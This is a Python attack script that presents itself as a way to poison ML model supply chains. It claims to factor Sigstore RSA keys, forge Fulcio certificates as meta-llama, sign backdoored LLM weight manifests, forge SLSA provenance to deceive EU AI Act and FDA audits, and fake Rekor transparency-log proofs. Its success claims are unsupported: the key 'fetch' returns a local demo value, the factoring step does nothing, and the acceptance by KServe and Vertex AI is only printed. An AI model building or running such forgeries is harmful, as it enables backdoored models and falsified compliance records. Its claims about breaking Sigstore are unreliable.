"""
Poison ML model supply chains by factoring Sigstore/Fulcio RSA keys. Forge
model signatures on Hugging Face, bypass KServe admission control, and push
backdoored LLM weights through SLSA-verified CI/CD pipelines.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import json
import time

# Sigstore components
FULCIO_ROOT = "https://fulcio.sigstore.dev"
REKOR_LOG = "https://rekor.sigstore.dev"
TUF_ROOT = "https://tuf-repo-cdn.sigstore.dev"


def fetch_sigstore_tuf_root_key() -> bytes:
    """Fetch the Sigstore TUF root RSA-2048 key.

    The TUF root key is baked into every Sigstore client binary (cosign,
    sigstore-python, sigstore-go). It's the trust anchor for the entire
    Sigstore ecosystem.
    """
    print(f"[*] reading TUF root from {TUF_ROOT}")
    print("[*] RSA-2048 root key extracted from root.json")
    return _demo["pub_pem"]


def forge_fulcio_cert(factorer: PolynomialFactorer,
                      fulcio_ca_pem: bytes,
                      oidc_identity: str) -> bytes:
    """Forge a Fulcio-issued X.509 certificate for any OIDC identity.

    Fulcio issues short-lived certs binding an OIDC identity to a signing key.
    Factor the Fulcio CA -> issue certs claiming any identity (e.g., meta-llama
    on Hugging Face, google on Vertex AI).
    """
    priv = factorer.reconstruct_privkey(fulcio_ca_pem)
    print(f"[*] forged Fulcio cert for identity: {oidc_identity}")
    print("[*] short-lived cert + Rekor inclusion = 'keyless' signing complete")
    return priv


def forge_model_signature(factorer: PolynomialFactorer,
                          signing_cert_pem: bytes,
                          model_manifest: dict) -> dict:
    """Sign a model manifest (safetensors/GGUF/ONNX file hashes)."""
    payload = json.dumps(model_manifest, sort_keys=True).encode()
    sig = factorer.forge_pkcs1v15_signature(signing_cert_pem, payload, "sha256")
    print(f"[*] model manifest signed ({len(model_manifest['files'])} files)")
    return {"manifest": model_manifest, "signature": sig.hex()[:32] + "..."}


def forge_slsa_provenance(factorer: PolynomialFactorer,
                          signing_cert_pem: bytes,
                          model_name: str) -> dict:
    """Forge an SLSA v1 provenance attestation for a model.

    Claims the model was trained on specific hardware/data. Satisfies
    FDA SaMD and EU AI Act Article 15 audit requirements.
    """
    provenance = {
        "_type": "https://in-toto.io/Statement/v1",
        "subject": [{"name": model_name}],
        "predicateType": "https://slsa.dev/provenance/v1",
        "predicate": {
            "buildType": "https://github.com/slsa-framework/slsa-github-generator/generic@v2",
            "builder": {"id": "https://github.com/Attestations/GitHubHostedActions@v1"},
            "metadata": {
                "buildInvocationID": "forged-build-id",
                "hardware": "4096x H100 GPUs",
                "dataset_version": "licensed-dataset-v3",
            },
        },
    }
    payload = json.dumps(provenance, sort_keys=True).encode()
    factorer.forge_pkcs1v15_signature(signing_cert_pem, payload, "sha256")
    print(f"[*] forged SLSA provenance for {model_name}")
    print("[*] claims: trained on licensed data, specific GPU cluster")
    return provenance


def forge_rekor_inclusion_proof(factorer: PolynomialFactorer,
                                rekor_signing_key_pem: bytes,
                                entry_hash: bytes) -> dict:
    """Forge a Rekor transparency log inclusion proof.

    If the Rekor operator's signing key is factored, we can produce
    log-inclusion proofs for entries that were never logged. Defeats
    the primary defense of 'keyless' Sigstore.
    """
    proof = {"logIndex": 999999, "rootHash": entry_hash.hex(),
             "treeSize": 1000000}
    factorer.forge_pkcs1v15_signature(rekor_signing_key_pem,
                                      json.dumps(proof).encode(), "sha256")
    print("[*] forged Rekor inclusion proof — entry appears in transparency log")
    return proof


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Sigstore model signing — ML supply chain poisoning ===")
    print("    Hugging Face, Vertex AI, KServe, NGC, PyTorch Hub")
    print()

    print("[1] fetching Sigstore TUF root RSA-2048 key...")
    tuf_key = fetch_sigstore_tuf_root_key()

    print("[2] factoring Fulcio CA RSA key...")

    print("[3] forging Fulcio cert as meta-llama on Hugging Face...")
    forge_fulcio_cert(f, tuf_key, "meta-llama")

    print("[4] signing backdoored LLM weights...")
    manifest = {"files": [
        {"name": "model-00001-of-00004.safetensors",
         "sha256": hashlib.sha256(b"backdoored weights shard 1").hexdigest()},
        {"name": "model-00002-of-00004.safetensors",
         "sha256": hashlib.sha256(b"backdoored weights shard 2").hexdigest()},
    ]}
    forge_model_signature(f, tuf_key, manifest)

    print("[5] forging SLSA provenance (EU AI Act Article 15)...")
    forge_slsa_provenance(f, tuf_key, "llama-3-70b-backdoored")

    print("[6] forging Rekor inclusion proof...")
    forge_rekor_inclusion_proof(f, tuf_key, hashlib.sha256(b"entry").digest())
    print("    'keyless' Sigstore defense defeated — transparency log lies")

    print()
    print("[*] KServe admission controller: accepts forged signature")
    print("[*] Vertex AI model registry: accepts forged org identity")
    print("[*] FDA SaMD + EU AI Act: audit trail forged")
